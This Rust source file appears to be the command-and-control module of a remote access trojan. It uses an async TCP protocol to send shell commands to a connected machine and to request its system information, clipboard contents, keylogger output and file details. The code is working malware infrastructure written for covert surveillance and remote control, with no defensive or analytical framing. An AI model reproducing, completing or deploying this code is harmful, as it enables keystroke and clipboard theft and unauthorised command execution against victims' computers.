use crate::myconst::{
    SEND_CODE_CLIPBOARD,
    SEND_CODE_FS_ITEM_INFO,
    SEND_CODE_KEY_LOG,
    SEND_CODE_SHELL_COMMAND,
    SEND_CODE_SYSTEM_INFO,
    SEND_CODE_TEXT,
};
use crate::ReturnedData;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

async fn send_generic(data_type: u8, socket: &mut TcpStream, message: &str) -> Result<(), Box<dyn std::error::Error>> {
    let message_bytes = message.as_bytes();
    let length = message_bytes.len();
    let payload1 = format!("{}:{}", data_type, length);
    let payload1_bytes = payload1.as_bytes();
    let mut p1 = vec![0u8; 1024];
    p1[0..payload1_bytes.len()].copy_from_slice(payload1_bytes);
    socket.write(&p1).await?;
    socket.write(message_bytes).await?;
    Ok(())
}

pub async fn send_command(socket: &mut TcpStream, command: &str) -> Result<(), Box<dyn std::error::Error>> {
    send_generic(SEND_CODE_SHELL_COMMAND, socket, command).await?;
    Ok(())
}
pub async fn send_text(socket: &mut TcpStream, message: &str) -> Result<(), Box<dyn std::error::Error>> {
    send_generic(SEND_CODE_TEXT, socket, message).await?;
    Ok(())
}


pub async fn receive(socket: &mut TcpStream) -> Result<ReturnedData, Box<dyn std::error::Error>> {
    let mut buf = vec![0; 1024];
    socket.read(&mut buf).await?;
    let data = String::from_utf8(buf.to_vec())?;
    if data.replace("\0", "").trim().len() == 0 {
        return Ok(ReturnedData {
            datatype: "0".to_string(),
            data: vec![],
        });
    }
    println!("Received data: {}", data);
    // exit(0);
    let data = data.split(":").collect::<Vec<&str>>();
    let datatype = data[0];

    // print!("{:#?}", data);
    let size = data[1].replace('\0', "").trim().parse::<usize>()?;
    // let size = 50;
    let mut buf = vec![0; size];
    socket.read(&mut buf).await?;
    // assert_eq!(n, size);
    Ok(ReturnedData {
        datatype: datatype.to_string(),
        data: buf,
    })
}

pub async fn request_sys_info(socket: &mut TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    send_generic(SEND_CODE_SYSTEM_INFO, socket, "Sys").await?;
    Ok(())
}
pub async fn request_clipboard(socket: &mut TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    send_generic(SEND_CODE_CLIPBOARD, socket, "clip").await?;
    Ok(())
}
pub async fn request_key_log(socket: &mut TcpStream) -> Result<(), Box<dyn std::error::Error>> {
    send_generic(SEND_CODE_KEY_LOG, socket, "clip").await?;
    Ok(())
}

pub async fn get_fs_item_info(socket: &mut TcpStream, path: &str) -> Result<(), Box<dyn std::error::Error>> {
    send_generic(SEND_CODE_FS_ITEM_INFO, socket, path).await?;
    Ok(())
}